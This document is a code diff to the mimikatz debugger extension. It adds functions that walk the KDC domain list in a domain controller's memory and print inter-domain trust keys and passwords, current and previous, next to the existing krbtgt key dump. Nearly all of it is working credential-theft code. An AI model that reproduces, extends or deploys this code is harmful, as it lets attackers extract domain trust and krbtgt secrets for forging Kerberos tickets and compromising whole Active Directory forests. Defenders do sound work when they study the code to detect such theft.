@@ -82,7 +82,7 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 
 DECLARE_API(mimikatz)
 {
-	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0;
+	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0, pDomainList = 0;
 	PLIST_ENTRY LogonSessionList;
 	ULONG LogonSessionListCount, i, j;
 	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
@@ -108,13 +108,12 @@ DECLARE_API(mimikatz)
 
 	pLogonSessionList = GetExpression("lsasrv!LogonSessionList");
 	pLogonSessionListCount = GetExpression("lsasrv!LogonSessionListCount");
-	pSecData = GetExpression("kdcsvc!SecData");
 
 	for(j = 0; j < ARRAYSIZE(packages); j++)
 		if(packages[j].symbolName)
 			packages[j].symbolPtr = GetExpression(packages[j].symbolName);
 	
-	if(pSecData)
+	if(pSecData = GetExpression("kdcsvc!SecData"))
 	{
 		if(ReadMemory(pSecData + SECDATA_KRBTGT_OFFSET*sizeof(PVOID), &dualKrbtgt, 2*sizeof(PVOID), NULL))
 		{
@@ -122,7 +121,12 @@ DECLARE_API(mimikatz)
 			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, "Previous");
 		}
 	}
-	
+#ifdef _M_X64
+	if(pDomainList = GetExpression("kdcsvc!KdcDomainList"))
+	{
+		kuhl_m_sekurlsa_krbtgt_trust(pDomainList);
+	}
+#endif
 	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_init()))
 	{
 		if(pInitializationVector && phAesKey && ph3DesKey)
@@ -390,9 +394,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					else kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);
 				}
 
-				LocalFree(mesCreds->UserName.Buffer);
-				LocalFree(mesCreds->Domaine.Buffer);
-				LocalFree(mesCreds->Password.Buffer);
+				if(username)
+					LocalFree(username->Buffer);
+				if(domain)
+					LocalFree(domain->Buffer);
+				if(password)
+					LocalFree(password->Buffer);
 			}
 		}
 		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
@@ -461,3 +468,86 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
 		}
 	}
 }
+
+#ifdef _M_X64
+void kuhl_m_sekurlsa_krbtgt_trust(ULONG_PTR addr)
+{
+	ULONG_PTR buffer;
+	KDC_DOMAIN_INFO domainInfo;
+
+	if(ReadMemory(addr, &buffer, sizeof(ULONG_PTR), NULL))
+	{
+		while(buffer != addr)
+		{
+			if(ReadMemory(buffer, &domainInfo, sizeof(KDC_DOMAIN_INFO), NULL))
+			{
+				kuhl_m_sekurlsa_trust_domaininfo(&domainInfo);
+				buffer = (ULONG_PTR) domainInfo.list.Flink;
+			}
+			else break;
+		}
+	}
+}
+
+void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCSTR prefix, BOOL incoming, PUNICODE_STRING domain)
+{
+	DWORD i;
+	PKDC_DOMAIN_KEYS domainKeys;
+
+	if((keysInfo->keysSize && keysInfo->keys) || (keysInfo->password.Length && keysInfo->password.Buffer))
+	{
+		dprintf("\n  [%s] ", prefix);
+		dprintf(incoming ? "-> %wZ\n" : "%wZ ->\n", domain);
+
+		if(kull_m_string_getDbgUnicodeString(&keysInfo->password))
+		{
+			dprintf("\tfrom: ");
+			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
+				dprintf("%wZ", &keysInfo->password);
+			else kull_m_string_dprintf_hex(keysInfo->password.Buffer, keysInfo->password.Length, 1);
+			LocalFree(keysInfo->password.Buffer);
+		}
+		dprintf("\n");
+
+		if(keysInfo->keysSize && keysInfo->keys)
+		{
+			if(domainKeys = (PKDC_DOMAIN_KEYS) LocalAlloc(LPTR, keysInfo->keysSize))
+			{
+				if(ReadMemory((ULONG_PTR) keysInfo->keys, domainKeys, keysInfo->keysSize, NULL))
+				{
+					for(i = 0; i < domainKeys->nbKeys; i++)
+					{
+						dprintf("\t* %s : ", kuhl_m_kerberos_ticket_etype(domainKeys->keys[i].type));
+						kull_m_string_dprintf_hex((PBYTE) domainKeys + domainKeys->keys[i].offset, domainKeys->keys[i].size, 0);
+						dprintf("\n");
+					}
+				}
+				LocalFree(domainKeys);
+			}
+		}
+	}
+}
+
+void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
+{
+	if(kull_m_string_getDbgUnicodeString(&info->FullDomainName))
+	{
+		if(kull_m_string_getDbgUnicodeString(&info->NetBiosName))
+		{
+			dprintf("\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
+			if(kuhl_m_sekurlsa_utils_getSid(&info->DomainSid))
+			{
+				dprintf(" / "); kull_m_string_displaySID(info->DomainSid);
+				LocalFree(info->DomainSid);
+			}
+			dprintf(")\n");
+			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, " Out ", FALSE, &info->FullDomainName);	// Input keys are for Out relation ship...
+			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, "  In ", TRUE, &info->FullDomainName);
+			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, "Out-1", FALSE, &info->FullDomainName);
+			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, " In-1", TRUE, &info->FullDomainName);
+			LocalFree(info->NetBiosName.Buffer);
+		}
+		LocalFree(info->FullDomainName.Buffer);
+	}
+}
+#endif
